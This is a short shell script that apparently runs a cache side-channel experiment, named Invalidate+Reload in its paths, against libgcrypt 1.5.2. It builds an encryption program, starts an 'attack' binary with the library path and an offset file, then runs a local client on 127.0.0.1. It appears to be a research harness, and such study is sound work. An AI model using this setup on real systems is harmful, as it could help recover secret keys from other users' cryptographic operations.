#!/bin/bash

make clean
make
./encrypt -m encrypt_send_seperately

LIBGCRYPT=/usr/local/lib/libgcrypt.so.11.8.1
OFFSET=${HOME}/INV-RELOAD/doc/offset-libgcrypt-1.5.2.txt
CYCLE=$1

./attack ${LIBGCRYPT} ${OFFSET} ${CYCLE} &
ATTACK_PID=$!

sleep 0.001

./client -i 127.0.0.1 &
CLIENT_PID=$!

trap "kill -TERM ${ATTACK_PID} ${CLIENT_PID}" INT QUIT

wait ${ATTACK_PID}
wait ${CLIENT_PID}
